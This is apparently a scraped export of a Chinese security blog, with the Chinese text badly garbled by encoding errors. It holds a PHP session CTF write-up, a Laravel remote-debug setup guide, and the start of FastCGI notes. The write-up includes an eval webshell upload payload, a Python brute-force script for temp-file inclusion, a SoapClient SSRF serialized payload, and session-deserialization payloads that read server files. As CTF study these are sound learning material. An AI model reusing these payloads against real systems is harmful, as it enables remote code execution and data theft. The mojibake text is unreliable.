wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\u0026#34;;@eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; ------WebKitFormBoundaryeScXqSzdW2v22xyk-- ä¸Šå¸è§†è§’çœ‹çš„è¯æ˜¯è¿™æ ·\nç”¨pyè„šæœ¬çˆ†ç ´å‡ºæ¥(py2)\nimport requests import string charset = string.digits + string.letters host = \u0026#34;10.99.99.16\u0026#34; port = 80 base_url = \u0026#34;http://%s:%d\u0026#34; % (host, port) def brute_force_tmp_files(): for i in charset: for j in charset: for k in charset: for l in charset: for m in charset: for n in charset: filename = i + j + k + l + m + n url = \u0026#34;%s/index.php?function=extract\u0026amp;file=/tmp/php%s\u0026#34; % ( base_url, filename) print url try: response = requests.get(url) if \u0026#39;wwwwwwwwwwwwww\u0026#39; in response.content: print \u0026#34;[+] Include success!\u0026#34; return True except Exception as e: print e return False def main(): brute_force_tmp_files() if __name__ == \u0026#34;__main__\u0026#34;: main() çˆ†ç ´æˆåŠŸåå°±æ‹¿åˆ°äº†shellï¼Œå…¶ä½™è·Ÿä¸Šé¢ä¸€æ ·\n[LCTF 2018]bestphp\u0026rsquo;s revenge â€”â€”â€”â€”è¿™ä¸ªæ —å­ç»“åˆäº†SoapClientå’Œsessionçš„è€ƒç‚¹\n\u0026lt;?php highlight_file(__FILE__); $b = \u0026#39;implode\u0026#39;; call_user_func($_GET[f],$_POST); session_start(); if(isset($_GET[name])){ $_SESSION[name] = $_GET[name]; } var_dump($_SESSION); $a = array(reset($_SESSION),\u0026#39;welcome_to_the_lctf2018\u0026#39;); call_user_func($b,$a); çœ‹åˆ°äº†æˆ‘ä»¬çš„è€æœ‹å‹call_user_funcï¼Œå®ƒä¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ï¼›å¦‚æœæˆ‘ä»¬ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯æ•°ç»„ï¼Œå®ƒä¼šæŠŠæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ä½œä¸ºç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“ä½œæ–¹æ³•è¿›è¡Œå›è°ƒï¼ˆååºåˆ—åŒ–ä¸­å¸¸è§ï¼‰ï¼›call_user_funcå‡½æ•°ä¸ä»…å¯ä»¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°å’Œç±»ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨phpå†…ç½®å‡½æ•°å’Œå†…ç½®ç±»ï¼Œæ¯”å¦‚extract\nflag.phpå¯ä»¥ç›´æ¥è®¿é—®ï¼ˆè¿™é‡Œæˆ‘æ²¡æœ‰æ‰« çœ‹wpçŸ¥é“çš„ robots.txtå’Œé¡µé¢æºç éƒ½æ²¡æœ‰ç›´æ¥çš„æç¤ºï¼‰\nè¿™ä¸ªå›æ˜¾å¾ˆæ˜æ˜¾éœ€è¦ssrfï¼Œä»¥localhostè®¿é—®flag.phpå°±ä¼šå°†flagå†™å…¥SESSIONä¸­\nå†…ç½®ç±»SoapClient()æ»¡è¶³è¿™ä¸ªéœ€è¦ï¼Œå®ƒå¯ä»¥é€šè¿‡ååºåˆ—åŒ–æ¥å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼ˆéœ€è¦è¢«è°ƒç”¨__call\næ‰€ä»¥æ•´ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼š\nè¦†ç›–åºåˆ—åŒ–å¼•æ“ä¸ºphp_serializeï¼Œ é€šè¿‡session_startå°†ä¸€ä¸ªåºåˆ—åŒ–çš„SoapClientå†™å…¥sessionï¼›ç”±äºgetä¼ å…¥çš„nameä¼šè¢«ç›´æ¥æ”¾å…¥sessionä¸­ï¼Œæ‰€ä»¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸ç”¨postä¼ ï¼Œåªéœ€è¦postä¼ è®¾ç½®ååºåˆ—åŒ–å¼•æ“çš„å‚æ•°å°±å¯ä»¥ ç¬¬ä¸€ä¸ªcall_user_funcé€šè¿‡extractå˜é‡è¦†ç›–ä½¿$b = call_user_funcï¼Œç¬¬äºŒä¸ªcall_user_funcè°ƒç”¨SoapClient-\u0026gt;__callï¼ˆä¸å¯è®¿é—®çš„æ–¹æ³• call_user_funcï¼‰ \u0026lt;?php $target=\u0026#39;http://127.0.0.1/flag.php\u0026#39;; $b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39; =\u0026gt; \u0026#34;AAA:BBB\\r\\n\u0026#34; . \u0026#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83\u0026#34;, \u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;http://127.0.0.1/\u0026#34;)); $se = serialize($b); echo \u0026#34;|\u0026#34;.urlencode($se); // O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D /?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\u0026amp;f=session_start Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83 POST: serialize_handler=php_serialize /?name=Soapclient\u0026amp;f=extract Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83 POST: b=call_user_func ä¹‹ååˆ·æ–°é¡µé¢å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–äº†ï¼Œç”±äºä¸Šé¢æ„é€ çš„æ—¶å€™cookieå°±æ˜¯å½“å‰é¡µé¢çš„cookieï¼Œæ‰€ä»¥æ•´ä¸€å¥—è¿‡ç¨‹ä¸‹æ¥ä¸éœ€è¦å•ç‹¬æ”¹sessionï¼Œé¦–é¡µå°±å¯ä»¥çœ‹åˆ°ç»“æœ\n[Jarvisoj web]PHPINFO è¿™é‡Œæ˜¯é¢˜ç›®é¡µé¢ï¼›å¼€å¹•æºç \n\u0026lt;?php //A webshell is wait for you ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); session_start(); class OowoO { public $mdzz; function __construct() { $this-\u0026gt;mdzz = \u0026#39;phpinfo();\u0026#39;; } function __destruct() { eval($this-\u0026gt;mdzz); } } if(isset($_GET[\u0026#39;phpinfo\u0026#39;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(\u0026#39;index.php\u0026#39;)); } ?\u0026gt; å…ˆçœ‹çœ‹phpinfoï¼Œåº”è¯¥æœ‰æç¤ºä¿¡æ¯ï¼›å‘ç°session.upload_progress.enabled=Onï¼Œè¿™å°±éå¸¸å¥½äº†ï¼Œæ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•æŠŠæˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç åºåˆ—åŒ–åè®¾ä¸ºæ–‡ä»¶åä¼ å…¥\nåºåˆ—åŒ–exp\n\u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php_serialize\u0026#39;); session_start(); \u0026lt;?php class OowoO { public $mdzz=\u0026#39;print_r(scandir(dirname(__FILE__)));\u0026#39;; } $obj = new OowoO(); echo \u0026#34;|\u0026#34;.serialize($obj); // |O:5:\u0026#34;OowoO\u0026#34;:1:{s:4:\u0026#34;mdzz\u0026#34;;s:36:\u0026#34;print_r(scandir(dirname(__FILE__)));\u0026#34;;} æ„é€ ä¸Šä¼ è¡¨å•ï¼Œæ³¨æ„æ–‡ä»¶åçš„å¼•å·è¦åŠ åæ–œæ è½¬ä¹‰\n|O:5:\\\u0026#34;OowoO\\\u0026#34;:1:{s:4:\\\u0026#34;mdzz\\\u0026#34;;s:36:\\\u0026#34;print_r(scandir(dirname(__FILE__)));\\\u0026#34;;} ç„¶åè®¿é—®è¿™ä¸ªphp\npublic $mdzz=\u0026#39;print_r(file_get_contents(\u0026#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\u0026#34;));\u0026#39;; |O:5:\\\u0026#34;OowoO\\\u0026#34;:1:{s:4:\\\u0026#34;mdzz\\\u0026#34;;s:88:\\\u0026#34;print_r(file_get_contents(\\\u0026#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\\u0026#34;));\\\u0026#34;;} å¾—åˆ°flag\nå‘¼â€¦â€¦é•¿èˆ’ä¸€å£æ°”ï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹ç»ˆäºç”»ä¸Šäº†ä¸€ä¸ªå°å¥å·ï¼›æš‘å‡æ€»ç»“phpååºåˆ—åŒ–çš„æ—¶å€™å°±å·®æ•´ä¸ªå’Œå†…ç½®ç±»ï¼Œç»“æœç£¨ç£¨è¹­è¹­æ‹–åˆ°ä»Šå¤©ï¼Œä¸è¿‡è¿˜æ˜¯è¢«æˆ‘ç»ˆç»“æ‰å•¦ï¼æ–‡ä¸­è¿˜è®¾è®¡äº†ä¸€ç‚¹SoapClientå†…ç½®ç±»çš„ä¸œè¥¿ï¼Œç”±äºç¯‡å¹…åŸå› ä¸å±•å¼€è®²äº†= = ã€\næœ€è¿‘çš„è®¡åˆ’å’Œå®‰æ’å°±æ˜¯åˆ·é¢˜\u0026amp;æŠŠä¹‹å‰çš„çŸ¥è¯†ä½“ç³»å¡«å……å®Œæ•´ï¼ŒåŠ æ²¹å•¦\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ LCTF 2018 Writeup \u0026ndash; ROIS\nLFI via SegmentFault\nPHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶\nåˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€\nå¦‚æœ‰é—æ¼è¯·æŒ‡æ­£ï¼ï¼ï¼\n","date":"2021-11-29T22:23:42+08:00","permalink":"https://amiaaaz.github.io/2021/11/29/php-session-study-notes/","section":"posts","tags":["PHP","PHP_Session","unserialize"],"title":"PHP_Sessionå­¦ä¹ ç¬”è®°"},{"categories":["LTS","ç¯å¢ƒé…ç½®"],"contents":"é¦–å…ˆï¼Œè¿™é‡Œçš„æƒ…å†µä¸ä¸€èˆ¬çš„æœ¬åœ°è°ƒè¯•localhostä¸åŒï¼Œæ˜¯æœ¬åœ°debugè¿œç¨‹ä¸»æœºçš„dockeå†…çš„phpé¡¹ç›®ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„laravelï¼›å¯èƒ½æœ‰çš„äººè§‰å¾—å¤šæ­¤ä¸€ä¸¾ï¼Œç›´æ¥åœ¨æœ¬åœ°æ­å»ºé¡¹ç›®ã€è¿è¡Œã€debugä¸€æ°”å‘µæˆï¼Œé€Ÿåº¦è¿˜å¿«ï¼Œä½•å¿…åˆ°è¿œç¨‹è·‘ä¸€é€šï¼Ÿé‚£æˆ‘åªèƒ½è¯´too youngï¼Œå¹´è½»äººè¿˜æ˜¯è¦æœ‰ç‚¹é•¿è¿œçš„æ‰“ç®—ï¼ˆ\nä¸€åˆ‡çš„èµ·å› æ˜¯æˆ‘æƒ³å¤ç°cve-2021-3129ï¼Œé¡ºä¾¿äº²è‡ªåŠ¨æ‰‹è·Ÿä¸€è·Ÿ\u0026amp;æŒ–ä¸€æŒ–laravelæ¡†æ¶ååºåˆ—åŒ–çš„é“¾å­ï¼Œç»“æœä»£ç å®¡è®¡ä¹‹å‰å…ˆè¢«ç¯å¢ƒé…ç½®å›°ä½äº†ï¼›è¢«è¿™ä¸ªç³Ÿå¿ƒçš„è°ƒè¯•ä»å‘¨äºŒä¸‹åˆæŠ˜ç£¨åˆ°å‘¨å››çš„å‡Œæ™¨ï¼Œå‡ ä¹æ˜¯æŠŠèƒ½è¸©çš„å‘è¸©äº†ä¸ªéï¼ˆç—›è‹¦é¢å…·ï¼‰ï¼Œç›´åˆ°ç°åœ¨çš„è§£å†³æ–¹æ¡ˆä¹Ÿä¸èƒ½ç®—æ˜¯æœ€ä¼˜è§£ï¼Œä¸è¿‡æ˜¯èƒ½æ­£å¸¸ç¨³å®šçš„è·‘èµ·æ¥äº†ï¼Œæ¬¡ä¼˜è§£ï¼›æ„Ÿè°¢portainerè®©æˆ‘èƒ½è½»æ¾åˆ›å»ºdocker\næŠŠè¯¦ç»†çš„æ­¥éª¤è®°å½•åˆ°è¿™ç¯‡åšå®¢é‡Œï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°çœ‹åˆ°çš„äºº~æ¬¢è¿å‹å¥½äº¤æµï¼\nå…ˆè¯´ä¸‹æœ¬æ¬¡é…ç½®çš„ç¯å¢ƒæ•´ä½“éœ€æ±‚å§ï¼š\nè¿œç¨‹vpsçš„docker(FROM php:7.4-apache): éœ€å¼€æ”¾webé¡µé¢ç«¯å£ + sshç«¯å£ï¼ˆæ— éœ€æŒ‚è½½ç›®å½• laravel 8.4.2, laravel/framework 8.22.1, facade/ignition 2.5.1 æœ¬åœ°ide: PHPStorm + ä¸€ä¸ªæ˜ å°„åˆ°å…¬ç½‘ipçš„ä¾›è°ƒè¯•è¿æ¥ä½¿ç”¨çš„ç«¯å£ï¼ˆåé¢ä¼šè§£é‡ŠåŸå› ï¼‰ é™¤äº†æœ€åçš„laravelä¹‹å¤–å°±éƒ½æ˜¯è°ƒphpçš„é€šç”¨æµç¨‹å•¦ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§~\nè¿œç¨‹docker\u0026amp;laravelçš„ç¯å¢ƒæ­å»º ä»¥php:7.4-apacheé•œåƒä½œä¸ºåŸºç¡€è¿›è¡Œåˆ›å»ºï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯portainerï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆä¸å†™dockerfileï¼Œé—®å°±æ˜¯è¿˜åœ¨å­¦ç€æ€ä¹ˆå†™ï¼ˆä¸€å®šä¸é¸½ è¿‘æœŸä¼šæ›´æ–°åˆ°è¿™é‡Œçš„\napt update apt-get install -y ssh git unzip vim /etc/ssh/sshd_config\t# å¼€å¯å¯¹åº”é€‰é¡¹ æ¯”å¦‚å…è®¸rootè¿æ¥ä»€ä¹ˆçš„ ä¸ç”¨æˆ‘ç»†å—¦ å„ä½å¸¦æ‰‹å­ä»¬éƒ½åº”è¯¥æ‡‚ pecl install xdebug touch /var/log/php/xdebug_remote.log\t# å¦‚æœéœ€è¦logçš„è¯è¦æå‰åˆ›å»ºå¥½å™¢ vim /usr/local/etc/php/php.ini\t# å°†ä¸‹é¢æ¡†ä¸­å†…å®¹ç²˜åˆ°æœ«å°¾å³å¯ [Xdebug] ; è¿™ä¸€é¡¹å®‰è£…å¥½ä¹‹åä¼šæœ‰æç¤º zend_extension=\u0026#34;/usr/local/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so\u0026#34; xdebug.mode=debug xdebug.client_host=your_vps xdebug.client_port=port xdebug.idekey=laravel xdebug.remote_handler=\u0026#34;dbgp\u0026#34; xdebug.log=\u0026#34;/var/log/php/xdebug_remote.log\u0026#34; æ­¤å¤„å®‰è£…ç‰ˆæœ¬ä¸ºxdebug3ï¼Œä¸xdebug2çš„é…ç½®è¯­æ³•æœ‰ä¸€äº›å‡ºå…¥ï¼Œå…·ä½“æ›´æ–°çš„å†…å®¹è¯¦è§æ›´æ–°æ–‡æ¡£ï¼Œå®‰è£…å¥½xdebugåæ‰§è¡Œphp -vå‘½ä»¤ä¼šæœ‰æ˜¾ç¤ºç‰ˆæœ¬\nwget https://github.com/composer/composer/releases/download/2.1.12/composer.phar mv composer.phar /usr/local/bin/composer chmod +x /usr/local/bin/composer cd /var/www composer create-project laravel/laravel . \u0026#34;v8.4.2\u0026#34; vim composer.json\t# ä¿®æ”¹å†…å®¹è§ä¸‹ composer update mv public html chmod -R 777 /var/www \u0026#34;laravel/framework\u0026#34;: \u0026#34;8.22.1\u0026#34; \u0026#34;facade/ignition\u0026#34;: \u0026#34;2.5.1\u0026#34; ä¸€ä¸ªå‘ç‚¹ï¼šå³ä½¿æŒ‡å®šäº†laravel/laravelç‰ˆæœ¬ï¼Œcomposeråˆ›å»ºé»˜è®¤ä¼šä½¿ç”¨æœ€æ–°çš„laravel/frameworkç‰ˆæœ¬\u0026amp;ç›¸å…³ç»„ä»¶ä¾èµ–ï¼ˆæ¯”å¦‚ç°åœ¨æ˜¯8.73.2ï¼‰ï¼Œç”±äºæˆ‘ä»¬éœ€è¦å¤ç°çš„cveæœ‰ç‰¹æ®Šçš„laravelç»„ä»¶ç‰ˆæœ¬éœ€æ±‚ï¼Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å•ç‹¬å¯¹composer.jsonè¿›è¡Œä¿®æ”¹ï¼Œç„¶åæ‰§è¡Œcomposer updateè¿›è¡Œæ›´æ–°\nä¸€åˆ‡é¡ºåˆ©çš„è¯è®¿é—®webé¡µé¢å°±å¯ä»¥çœ‹åˆ°laravelå•¦\nä¸æœ¬åœ°çš„PHPStormè¿æ¥èµ·æ¥è¿›è¡Œdebug å¼€å§‹ä¹‹å‰å…ˆè‡ªé—®è‡ªç­”ä¸€ä¸‹ï¼šä¸ºä»€ä¹ˆè°ƒè¯•è¦ä¸€ä¸ªèƒ½æ˜ å°„åˆ°å…¬ç½‘çš„ç«¯å£ï¼Ÿ\nPHPStormä¸­é›†æˆäº†éµå¾ªDBGpåè®®çš„Xdebugæ’ä»¶ï¼Œå½“å¼€å¯ç›‘å¬æ—¶ä¼šç›‘å¬æœ¬åœ°æŒ‡å®šç«¯å£ï¼Œå½“è®¿é—®æŒ‡å®šserverçš„webé¡µé¢å¹¶å¸¦æœ‰å«æœ‰ide_keyçš„ç‰¹å®šcookieå‚æ•°ä¹‹åï¼ŒXdebugä¼šæ¥æ”¶åˆ°è¿™ä¸ªå‚æ•°å¹¶å¼€å¯debugï¼Œé€šè¿‡DBGpåè®®å‘php.iniä¸­æŒ‡å®šçš„ip\u0026amp;portå‘é€è¯·æ±‚ï¼Œå½“è¿™ä¸ªportæŒ‡å‘æˆ‘ä»¬ideåœ¨ç›‘å¬çš„ç«¯å£æ—¶ï¼Œå°±ä¼šå»ºç«‹èµ·Xdebugå’Œideçš„è¿æ¥ï¼ˆä½¿ç”¨DBGpåè®®é€šè®¯ï¼‰ï¼Œéšåå®ƒä»¬ä¹‹é—´è¿›è¡Œæ•°æ®äº¤äº’ï¼Œå¦‚æ­¤åå¤ï¼›æ›´è¯¦ç»†çš„å†…å®¹è¯·å‚è§-\u0026gt;6.3 IDE to debugger engine communications\nè¿™ä¸‹å°±å¥½ç†è§£äº†å­ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œéœ€è¦ä¸€ä¸ªä¸è¿œç¨‹ä»£ç è¿è¡Œç¯å¢ƒå¤„åœ¨åŒä¸€ä¸ªç½‘æ®µä¸‹çš„ç«¯å£ï¼ˆå…¬ç½‘çš„æ›´å¥½ï¼‰ï¼›æ¥ä¸‹æ¥å°±æ˜¯é…ç½®å•¦\nå†…ç½‘ç©¿é€ å†…ç½‘ç©¿é€æˆ‘ä½¿ç”¨çš„æ˜¯npsï¼Œé…ç½®è¿‡ç¨‹å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼Œç”±äºæˆ‘è¿™é‡Œé…çš„æ¯”è¾ƒæ—© è¿™éƒ¨åˆ†è·³è¿‡\nPHPStormçš„è®¾ç½®æœ‰ä¸€å † æŠŠdockerä¸­/wwwç›®å½•æ‰“åŒ…æ‹–ä¸‹æ¥ï¼Œç”¨PHPStormæ‰“å¼€\nè®¾ç½®Debug 20007æ˜¯æœ¬åœ°ç«¯å£ï¼Œè¢«æ˜ å°„åˆ°å…¬ç½‘ip\nè¿™é‡Œçš„20007æ˜¯å…¬ç½‘ç«¯å£ï¼Œä»£ç†æœ¬åœ°çš„20007\nå¦‚æœæˆ‘è®²æ¸…æ¥šå‰é¢åŸç†çš„è¯ï¼Œå¤§å®¶åº”è¯¥èƒ½ç†è§£è¿™ä¸¤ä¸ªåœ°æ–¹çš„ç«¯å£è®¾ç½®äºŒé€‰ä¸€å³å¯\nè®¾ç½®Deployment ç”¨SFTPä¸dockerè¿›è¡Œsshè¿æ¥ï¼Œæ–‡ä»¶æ˜ å°„\nè®¾ç½®è¿œç¨‹phpè§£é‡Šå™¨ é€‰æ‹©sshæ¨¡å¼ï¼Œé…ä¸€ä¸‹è´¦å·å¯†ç ç«¯å£å°±è¡Œï¼ˆè‡³äºä¸ºä»€ä¹ˆä¸ç”¨docker/docker-composeï¼Œä¹‹åä¼šè¯´ï¼‰ï¼Œè¿™é‡Œçš„Path mappingsç›´æ¥å°±æ˜¯Deploymentä¸­é…å¥½çš„ï¼Œå¯ä»¥å•ç‹¬å†åŠ ï¼Œä½†æ˜¯æ²¡å¿…è¦\nè®¾ç½®Server æ³¨æ„é«˜äº®åœ°æ–¹çš„è®¾ç½®ï¼Œæ˜¯webé¡µé¢çš„ç«¯å£ï¼Œä¹Ÿè¦è®¾ç½®å¥½æœ¬åœ°çš„è·¯å¾„æ˜ å°„\néªŒè¯ä¸€ä¸‹è”é€šæƒ…å†µ å¥½è€¶~\næµè§ˆå™¨æ’ä»¶Xdebug helper è®¾ç½®Debug Configurationï¼Œé€‰PHP Remote Debugæ¨¡å¼\nå®‰è£…æ’ä»¶ï¼Œè®¾ç½®ide_keyï¼Œå¼€å¯å°è™«å­\nç»ˆäºå®Œäº† éšä¾¿æ‰“ä¸ªæ–­ç‚¹ï¼Œå¼€å¯æœ¬åœ°ç›‘å¬\nåˆ·æ–°é¡µé¢\nèŠœæ¹–èµ·é£ï¼\n***å¾…å®Œå–„çš„åœ°æ–¹ é…ç½®è¿œç¨‹phpè§£é‡Šå™¨å¯ä»¥ä½¿ç”¨docker/docker-composeï¼Œè¿™ä¸¤ä¸ªéƒ½éœ€è¦å•ç‹¬æŒ‚è½½å…³é”®ç›®å½•å‡ºæ¥ï¼Œé…ç½®ä¸Šä¸sshçš„åŒºåˆ«è¿˜æ˜¯æœ‰ç‚¹å¤§çš„ï¼Œä¹Ÿéœ€è¦æ³¨æ„docker-composeæ–‡ä»¶çš„ç¼–å†™ï¼Œå…ˆæ‰”ä¸€ä¸ªå‚è€ƒèµ„æ–™-\u0026gt;Setting up PhpStorm with Xdebug for local development on Docker \u0026hellip; natively and via Deployment Configuration. å…³äºdockerfile/docker-composeæ–‡ä»¶çš„ç¼–å†™ï¼Œæˆ‘è¿˜ä¸æ˜¯å¾ˆç†Ÿç»ƒï¼Œè·Ÿä¸ç”¨è¯´è¿™æ ·çš„phpé¡¹ç›®äº†ï¼ŒåŒæ ·å…ˆæ‰”ä¸€ä¸ªå‚è€ƒèµ„æ–™-\u0026gt;Structuring the Docker setup for PHP Projects \u0026hellip; folder structure, Dockerfile templates and general fundamentals PHPStormæœ‰å†…ç½®çš„dockerç®¡ç†åŠŸèƒ½ï¼Œå¯ä»¥åˆ›å»ºé•œåƒ-\u0026gt;é…ç½®debugä¸€æ­¥åˆ°ä½ è™½ç„¶è¸©äº†å¾ˆå¤šå‘ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ï¼Œå¸Œæœ›èƒ½å¤šå°‘å¸®åŠ©ä¸€äº›äººå°‘èµ°å¼¯è·¯ï¼ˆ\né™äºç¯‡å¹…åŸå› ï¼Œä»£ç å®¡è®¡çš„éƒ¨åˆ†å°±æ”¾åˆ°åé¢å•¦~\næœ€è¿‘æ›´æ–°çš„ä¸å¤ªå‹¤å¿«ï¼Œæˆ‘å…ˆè‡ªæˆ‘æ‰¹è¯„TATï¼Œå·²ç»å¾ˆèœäº†ä¸èƒ½å†ä¸åŠªåŠ›å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Š\n","date":"2021-11-25T18:44:34+08:00","permalink":"https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/","section":"posts","tags":["debug","PHP"],"title":"PHPè¿œç¨‹debugç¯å¢ƒé…ç½®"},{"categories":["NOTES\u0026SUMMARY"],"contents":"ä¹‹å‰åšé¢˜æ€»æ˜¯ä¼šè§åˆ°ï¼Œä½†å¹¶ä¸æ˜¯å¾ˆæ‡‚å®é™…çš„åŸç†ï¼Œæœ‰ç‚¹äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½åƒæ‡‚äº†ä½†åˆæ²¡æœ‰å®Œå…¨æ‡‚ï¼Œæ˜¯æ—¶å€™ä¸“é—¨æ¥å­¦ä¸€ä¸‹å’¯ï¼\næ²¡æœ‰ä»€ä¹ˆæ–°é²œçš„ä¸œè¥¿ï¼Œåªä¸è¿‡æŠŠå¸ˆå‚…ä»¬å·²æœ‰çš„æ–‡ç« è¿›è¡Œä¸€ä¸ªæ•´åˆ\u0026amp;é‡æ–°æ•´ç†ï¼Œå‚è€ƒé“¾æ¥æ”¾åˆ°æœ€åå•¦w\nå‰ç½®çŸ¥è¯† CGI/FastCGI CGIåè®®ç”¨äºå¤„ç†htmlè¿™ç±»é™æ€æ–‡ä»¶ä¹‹åå‡ºç°çš„åŠ¨æ€è¯­è¨€çš„è§£é‡Šå™¨ä¸webserveré€šä¿¡çš„é—®é¢˜ï¼Œå…·ä½“çš„å®ç°æœ‰php-cgi\nCGIçš„å¼Šç«¯æ˜¯ä»¤webserveræ¯æ¬¡å¤„ç†è¯·æ±‚æ—¶éƒ½ä¼šforkä¸€ä¸ªcgiè¿›ç¨‹ï¼Œç»“æŸåå†killï¼Œæ¯”è¾ƒæµªè´¹èµ„æºï¼ŒFastCGIåè®®å°±è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œå¤„ç†å®Œè¯·æ±‚åä¸ä¼škillè€Œæ˜¯ä¿ç•™è¯¥è¿›ç¨‹ï¼Œä½¿å®ƒå¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œè¿™æ ·å°±ä¸ç”¨æ¯æ¬¡forkäº†\nè€Œphp-fpmå°±æ˜¯FastCGIåè®®çš„ä¸€ä¸ªå…·ä½“å®ç°ï¼Œä½œä¸ºFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼ˆè¿è¡Œæ—¶æœ‰ä¸€ä¸ªä¸»è¿›ç¨‹å’Œå¤šä¸ªåŒ…å«phpè§£é‡Šå™¨çš„workerè¿›ç¨‹æ¥æ‰§è¡Œä»£ç ï¼‰ï¼Œç”¨äºæ¥æ”¶webserverçš„è¯·æ±‚\næŸ¥çœ‹phpinfoï¼ŒSever APIå¤„ä¸€èˆ¬ä¼šæœ‰ä¸‰ç§æ ·å¼ï¼š\nApache 2.0 Handler CGI/FastCGI FPM/FastCGI ç¬¬ä¸€ç§æŠŠphpä½œä¸ºapacheçš„ä¸€ä¸ªæ¨¡å—ï¼Œç›¸å½“äºapacheä¸­çš„ä¸€ä¸ª.dllæˆ–.soï¼›ç¬¬äºŒç§php-cgi.exeæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼ŒwebæœåŠ¡å™¨ä¹Ÿæ˜¯ç‹¬ç«‹çš„apache.exeï¼ŒwebæœåŠ¡å™¨ç›‘å¬åˆ°httpè¯·æ±‚æ—¶ä¼šå»è°ƒç”¨php-cgiè¿›ç¨‹ï¼Œä¹‹é—´é€šè¿‡cgiåè®®ä¼ é€’æ•°æ®ï¼›è€Œç¬¬ä¸‰ç§fastcgiä¹Ÿæ˜¯ä¸€ç§åè®®ï¼Œå®ƒåšäº†å¾ˆå¤šä¼˜åŒ–ä¸”å¸¸é©»å†…å­˜ 